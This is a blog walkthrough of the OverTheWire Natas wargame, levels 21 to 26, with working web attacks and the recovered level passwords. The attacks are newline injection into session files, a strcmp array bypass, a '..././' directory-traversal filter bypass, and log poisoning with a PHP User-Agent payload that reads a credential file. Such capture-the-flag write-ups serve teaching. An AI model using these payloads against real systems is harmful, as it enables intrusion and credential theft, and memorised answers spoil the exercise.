---
layout: post
title: "Natas wargame walkthrough, levels 21-X"
---

## 21

This level contains more source code than we've seen before. Looking through
it, we see functions for reading and writing session data. When we visit the
site for the first time, we're given a cookie with a session id, `PHPSESSID`.
When we enter a username, that username is stored in a file,
`mysess_<session id>`. When we revisit the site, that file is checked, to see if
the user is an admin (denoted by an `admin 1` row). We can trick the server into
thinking we are an admin by passing the username `user\nadmin 1`. This creates
the session file:

```
name: user
admin 1
```

We can create this username by hitting the URL with the following query string:

```
?debug=true&name=james%0Aadmin+1
```

`IFekPyrQXftziDEsUr3x21sYuahypdgJ`

## 22

This level is similar to [21](#21), but there are two different websites. The
two are colocated, and share a session file. The first displays the password if
the session key `admin = 1`. The second gives us a way to insert data into the
session file, by hitting the url with the query:

```
?debug=true&submit=true&admin=1
```

We note the value of the `PHPSESSID` on the second site, change the cookie to
the same value on the first site, and refresh to get the password.

`chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`

## 23

Looking at the source of this level, we see that the password is shown if the
key `revelio=true` is present in the GET request. However, if that key is
present, the server also sets the Location header to `/`, redirecting the
browser back to the home page. We can get around this by making a request to the
URL with the `revelio` key set, but not honouring the redirect:

```python
# -*- coding: utf-8 -*-

import requests

r = requests.get(
    "http://natas22.natas.labs.overthewire.org?revelio=true",
    auth=("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"),
    allow_redirects=False)

print r.text
```

`D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`

## 24

This level presents a password box to the user. If the correct password is
entered, the password to the next level will be displayed.

This source gives us:

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

We can see that we're looking for a password which contains `iloveyou`, and is
longer than ten characters.

I first tried `abciloveyou`, which didn't work, even though it should pass
both conditions of the `if` statement. I saw the comment `10111`, and tried
the password `10111iloveyou`, which worked.

`OsRmXFguozKpTZZ5X14zNO43379LZveg`

## 25

This is similar to [24](#24), but the password is printed if:

```php
<?php
!strcmp($_REQUEST["passwd"],"<censored>")
```

`strcmp` has a vulnerability. If one of the parameters passed to it isn't a
string, it will throw an exception and return 0, which will pass the `if`
expression test and show us the password. `PHP` converts query parameters in
the format `?key[]=value0,value1` to an array. We can therefore pass an array
to `strcmp` with:

```
?passwd[]=0
```

This prints out the password

`GHF6X7YwACaYYssHVY05cFq83hRktl4c`

## 26

Level 26 requires making use of three different vulnerabilities. The web request
can be passed a `lang` parameter, from which a file path is constructed, and
used to `include` the file. The user defined `lang` value is checked and
sanitised:

```php
<?php
if(strstr($filename,"../")){
    logRequest("Directory traversal attempt! fixing request.");
    $filename=str_replace("../","",$filename);
}
if(strstr($filename,"natas_webpass")){
    logRequest("Illegal file access detected! Aborting!");
    exit(-1);
}
```

Notice that the first `if` statment removes the string `../` if it is found,
but still passes the filename on. We can work around this by passing the string
`..././`, which becomes `../` when the central `../` is removed.

The function `logRequest` writes details about the bad request to a file:

```php
<?php
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```

This gives us two new points of entry: we can set the `User-Agent` header on
our request to change the value of `$_SERVER['HTTP_USER_AGENT']`, and we can
change our `PHPSESSID` cookie to change the value of `session_id()`.

We can set the `User-Agent` header to:

```php
<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>
```

Set the `PHPSESSID` cookie to `0`, and make a request with the query string:

```
?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_1.log
```

This `include`s the log file, running the PHP code which prints out the
password.

`oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
